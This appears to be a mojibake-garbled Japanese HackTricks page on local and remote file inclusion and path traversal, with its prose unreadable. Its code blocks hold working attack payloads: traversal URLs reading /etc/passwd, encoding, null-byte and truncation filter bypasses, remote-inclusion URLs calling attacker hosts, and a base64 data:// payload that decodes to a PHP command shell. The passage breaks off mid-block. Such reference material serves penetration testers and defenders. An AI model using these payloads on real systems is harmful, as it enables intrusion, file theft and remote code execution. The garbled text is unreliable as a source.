# ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³/ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ãã ã•ã„ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã‚¤ãƒ³ã‚µã‚¤ãƒˆ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨ã‚¤ãƒ³ã‚µã‚¤ãƒˆã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«é…ã‚Œãšã«ã¤ã„ã¦ã„ã

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã‚‹

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼**

## ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ (RFI):** ãƒ•ã‚¡ã‚¤ãƒ«ã¯ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚Œã¾ã™ï¼ˆæœ€è‰¯: ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ã‚µãƒ¼ãƒãƒ¼ãŒãã‚Œã‚’å®Ÿè¡Œã—ã¾ã™ï¼‰ã€‚PHPã§ã¯ã€ã“ã‚Œã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**ç„¡åŠ¹**ã§ã™ï¼ˆ**allow\_url\_include**ï¼‰ã€‚\
**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ (LFI):** ã‚µãƒ¼ãƒãƒ¼ã¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚

è„†å¼±æ€§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦èª­ã¿è¾¼ã¾ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½•ã‚‰ã‹ã®æ–¹æ³•ã§åˆ¶å¾¡ã§ãã‚‹ã¨ãã«ç™ºç”Ÿã—ã¾ã™ã€‚

è„†å¼±ãª**PHPé–¢æ•°**: require, require\_once, include, include\_once

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„ãƒ„ãƒ¼ãƒ«: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ - èˆˆå‘³æ·±ã„ - LFI2RCEãƒ•ã‚¡ã‚¤ãƒ«
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**ã„ãã¤ã‹ã® \*nix LFI ãƒªã‚¹ãƒˆã‚’æ··ãœã¦ã€ã•ã‚‰ã«ãƒ‘ã‚¹ã‚’è¿½åŠ ã—ã¦ã“ã‚Œã‚’ä½œæˆã—ã¾ã—ãŸ:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/` ã‚’ `\` ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„ã€‚\
`../../../../../` ã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

ãƒ•ã‚¡ã‚¤ãƒ« /etc/password ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸãƒªã‚¹ãƒˆï¼ˆè„†å¼±æ€§ãŒå­˜åœ¨ã™ã‚‹ã‹ç¢ºèªã™ã‚‹ãŸã‚ï¼‰ã¯ [ã“ã¡ã‚‰](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **Windows**

ç•°ãªã‚‹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã®ãƒãƒ¼ã‚¸:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/` ã‚’ `\` ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„ã€‚\
`C:/` ã‚’å‰Šé™¤ã—ã¦ `../../../../../` ã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

ãƒ•ã‚¡ã‚¤ãƒ« /boot.ini ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸãƒªã‚¹ãƒˆï¼ˆè„†å¼±æ€§ãŒå­˜åœ¨ã™ã‚‹ã‹ç¢ºèªã™ã‚‹ãŸã‚ï¼‰ã¯ [ã“ã¡ã‚‰](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **OS X**

Linux ã® LFI ãƒªã‚¹ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

## åŸºæœ¬çš„ãª LFI ã¨ãƒã‚¤ãƒ‘ã‚¹

ã™ã¹ã¦ã®ä¾‹ã¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ç”¨ã§ã™ãŒã€ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚‚é©ç”¨ã§ãã¾ã™ï¼ˆãƒšãƒ¼ã‚¸=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/ï¼‰ã€‚
```
http://example.com/index.php?page=../../../etc/passwd
```
### ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ãŒéå†å¸°çš„ã«å‰Šé™¤ã•ã‚Œã¾ã—ãŸ
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ãƒŒãƒ«ãƒã‚¤ãƒˆ (%00)**

æä¾›ã•ã‚ŒãŸæ–‡å­—åˆ—ã®æœ«å°¾ã«ã•ã‚‰ã«æ–‡å­—ã‚’è¿½åŠ ã™ã‚‹ã®ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ï¼ˆãƒã‚¤ãƒ‘ã‚¹: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
ã“ã‚Œã¯**PHP 5.4ä»¥é™è§£æ±ºã•ã‚Œã¦ã„ã¾ã™**

### **ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**

ãƒ€ãƒ–ãƒ«URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ï¼ˆãŠã‚ˆã³ãã®ä»–ï¼‰ãªã©ã®éæ¨™æº–ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### æ—¢å­˜ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‹ã‚‰

ãŠãã‚‰ããƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã¯ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ãƒ‘ã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã¾ã™ï¼š
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ¢ç´¢

ã‚µãƒ¼ãƒãƒ¼ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ç‰¹å®šã®æŠ€è¡“ã‚’ç”¨ã„ã¦ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã ã‘ã§ãªããƒ•ã‚¡ã‚¤ãƒ«ã‚‚å†å¸°çš„ã«æ¢ç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ç‰¹å®šã—ã€ç‰¹å®šã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã®å­˜åœ¨ã‚’æ¢ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ä»¥ä¸‹ã¯ã€ã“ã‚Œã‚’é”æˆã™ã‚‹ãŸã‚ã®è©³ç´°ãªæ–¹æ³•ã§ã™ï¼š

1. **ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ç‰¹å®šã™ã‚‹:** ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ã€`/etc/passwd`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ­£å¸¸ã«å–å¾—ã™ã‚‹ã“ã¨ã§ç¢ºèªã—ã¾ã™ï¼ˆã‚µãƒ¼ãƒãƒ¼ãŒLinuxãƒ™ãƒ¼ã‚¹ã®å ´åˆï¼‰ã€‚ä¾‹ã¨ã—ã¦ã€æ·±ã•ãŒ3ã§ã‚ã‚‹ã“ã¨ã‚’ç¤ºã™URLã¯æ¬¡ã®ã‚ˆã†ã«æ§‹æˆã•ã‚Œã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **ãƒ•ã‚©ãƒ«ãƒ€ã‚’èª¿æŸ»ã™ã‚‹:** ç–‘ã‚ã—ã„ãƒ•ã‚©ãƒ«ãƒ€ã®åå‰ï¼ˆä¾‹: `private`ï¼‰ã‚’URLã«è¿½åŠ ã—ã€ãã®å¾Œ`/etc/passwd`ã«æˆ»ã‚Šã¾ã™ã€‚è¿½åŠ ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ¬ãƒ™ãƒ«ã¯æ·±ã•ã‚’1ã¤å¢—ã‚„ã™å¿…è¦ãŒã‚ã‚Šã¾ã™:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **çµæœã®è§£é‡ˆ:** ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã¯ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã®å­˜åœ¨ã‚’ç¤ºã—ã¾ã™:
* **ã‚¨ãƒ©ãƒ¼ / å‡ºåŠ›ãªã—:** ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ `private` ã¯æŒ‡å®šã•ã‚ŒãŸå ´æ‰€ã«å­˜åœ¨ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* **`/etc/passwd` ã®å†…å®¹:** `private` ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã®å­˜åœ¨ãŒç¢ºèªã•ã‚Œã¾ã—ãŸã€‚
4. **å†å¸°çš„æ¢ç´¢:** ç™ºè¦‹ã•ã‚ŒãŸãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã¯ã€åŒã˜æŠ€è¡“ã¾ãŸã¯å¾“æ¥ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ (LFI) ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã•ã‚‰ã«èª¿æŸ»ã§ãã¾ã™ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®ç•°ãªã‚‹å ´æ‰€ã«ã‚ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’æ¢ç´¢ã™ã‚‹ã«ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é©å®œèª¿æ•´ã—ã¦ãã ã•ã„ã€‚ãŸã¨ãˆã°ã€`/var/www/` ã« `private` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã™ã‚‹ã«ã¯ï¼ˆç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒæ·±ã•3ã«ã‚ã‚‹ã¨ä»®å®šã—ã¦ï¼‰ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **ãƒ‘ã‚¹ãƒˆãƒ©ãƒ³ã‚±ãƒ¼ã‚·ãƒ§ãƒ³æŠ€è¡“**

ãƒ‘ã‚¹ãƒˆãƒ©ãƒ³ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚’æ“ä½œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹æ‰‹æ³•ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®æœ«å°¾ã«è¿½åŠ ã®æ–‡å­—ã‚’ä»˜åŠ ã™ã‚‹ç‰¹å®šã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å›é¿ã™ã‚‹ã“ã¨ã§ã€åˆ¶é™ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã—ã°ã—ã°ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ç›®çš„ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã«ã‚ˆã£ã¦å¤‰æ›´ã•ã‚ŒãŸå ´åˆã§ã‚‚ã€æœ›ã¾ã—ã„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒ‡ã™ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã™ã€‚

PHPã§ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®æ€§è³ªã«ã‚ˆã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®ã•ã¾ã–ã¾ãªè¡¨ç¾ãŒåŒç­‰ã¨è¦‹ãªã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ï¼š

* `/etc/passwd`ã€`/etc//passwd`ã€`/etc/./passwd`ã€ãŠã‚ˆã³`/etc/passwd/`ã¯ã™ã¹ã¦åŒã˜ãƒ‘ã‚¹ã¨ã—ã¦æ‰±ã‚ã‚Œã¾ã™ã€‚
* æœ€å¾Œã®6æ–‡å­—ãŒ`passwd`ã®å ´åˆã€`/`ã‚’è¿½åŠ ã—ã¦ã‚‚ï¼ˆ`passwd/`ã«ã™ã‚‹ï¼‰ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã¯å¤‰ã‚ã‚Šã¾ã›ã‚“ã€‚
* åŒæ§˜ã«ã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã«`.php`ã‚’è¿½åŠ ã—ãŸå ´åˆï¼ˆä¾‹ãˆã°`shellcode.php`ï¼‰ã€æœ«å°¾ã«`/.`ã‚’è¿½åŠ ã—ã¦ã‚‚ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯å¤‰æ›´ã•ã‚Œã¾ã›ã‚“ã€‚

æä¾›ã•ã‚ŒãŸä¾‹ã¯ã€ãƒ‘ã‚¹ãƒˆãƒ©ãƒ³ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã—ã¦ã€æ•æ„Ÿãªå†…å®¹ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆæƒ…å ±ï¼‰ã‚’æŒã¤ä¸€èˆ¬çš„ãªã‚¿ãƒ¼ã‚²ãƒƒãƒˆã§ã‚ã‚‹`/etc/passwd`ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
ã“ã‚Œã‚‰ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€å¿…è¦ãªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®æ•°ã¯ç´„2027ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã®æ•°ã¯ã‚µãƒ¼ãƒãƒ¼ã®æ§‹æˆã«ã‚ˆã£ã¦ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

* **ãƒ‰ãƒƒãƒˆã‚»ã‚°ãƒ¡ãƒ³ãƒˆã¨è¿½åŠ æ–‡å­—ã®ä½¿ç”¨**: ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ï¼ˆ`../`ï¼‰ã«è¿½åŠ ã®ãƒ‰ãƒƒãƒˆã‚»ã‚°ãƒ¡ãƒ³ãƒˆã‚„æ–‡å­—ã‚’çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ã§ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã—ã€ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦è¿½åŠ ã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’åŠ¹æœçš„ã«ç„¡è¦–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **å¿…è¦ãªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®æ•°ã‚’æ±ºå®šã™ã‚‹**: è©¦è¡ŒéŒ¯èª¤ã‚’é€šã˜ã¦ã€ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ç§»å‹•ã—ã€ãã®å¾Œ`/etc/passwd`ã«ç§»å‹•ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæ­£ç¢ºãª`../`ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã®æ•°ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€è¿½åŠ ã•ã‚ŒãŸæ–‡å­—åˆ—ï¼ˆ`.php`ãªã©ï¼‰ãŒç„¡åŠ¹åŒ–ã•ã‚Œã‚‹ä¸€æ–¹ã§ã€ç›®çš„ã®ãƒ‘ã‚¹ï¼ˆ`/etc/passwd`ï¼‰ã¯ãã®ã¾ã¾ä¿æŒã•ã‚Œã¾ã™ã€‚
* **å½ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰å§‹ã‚ã‚‹**: å­˜åœ¨ã—ãªã„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼ˆ`a/`ãªã©ï¼‰ã§ãƒ‘ã‚¹ã‚’å§‹ã‚ã‚‹ã®ã¯ä¸€èˆ¬çš„ãªæ…£è¡Œã§ã™ã€‚ã“ã®æŠ€è¡“ã¯äºˆé˜²æªç½®ã¨ã—ã¦ã€ã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‘ã‚¹è§£æãƒ­ã‚¸ãƒƒã‚¯ã®è¦ä»¶ã‚’æº€ãŸã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ‘ã‚¹ãƒˆãƒ©ãƒ³ã‚±ãƒ¼ã‚·ãƒ§ãƒ³æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹éš›ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‘ã‚¹è§£æã®æŒ™å‹•ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®æ§‹é€ ã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚å„ã‚·ãƒŠãƒªã‚ªã«ã¯ç•°ãªã‚‹ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒå¿…è¦ãªå ´åˆãŒã‚ã‚Šã€æœ€ã‚‚åŠ¹æœçš„ãªæ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ãƒ†ã‚¹ãƒˆãŒã—ã°ã—ã°å¿…è¦ã§ã™ã€‚

**ã“ã®è„†å¼±æ€§ã¯PHP 5.3ã§ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚**

### **ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãƒã‚¤ãƒ‘ã‚¹ãƒˆãƒªãƒƒã‚¯**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

phpã§ã¯ã€ã“ã‚Œã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ç„¡åŠ¹ã«ãªã£ã¦ã„ã¾ã™ã€‚ãªãœãªã‚‰ã€**`allow_url_include`**ãŒ**ã‚ªãƒ•**ã ã‹ã‚‰ã§ã™ã€‚ã“ã‚ŒãŒ**ã‚ªãƒ³**ã§ãªã‘ã‚Œã°æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚ãã®å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰PHPãƒ•ã‚¡ã‚¤ãƒ«ã‚’å«ã‚ã¦RCEã‚’å–å¾—ã§ãã¾ã™ï¼š
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
ã‚‚ã—ä½•ã‚‰ã‹ã®ç†ç”±ã§ **`allow_url_include`** ãŒ **On** ã§ã‚ã‚‹ãŒã€PHPãŒå¤–éƒ¨ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ **filtering** ã—ã¦ã„ã‚‹å ´åˆã€[ã“ã®æŠ•ç¨¿](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) ã«ã‚ˆã‚‹ã¨ã€ä¾‹ãˆã°ãƒ‡ãƒ¼ã‚¿ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦base64ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸPHPã‚³ãƒ¼ãƒ‰ã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã€RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
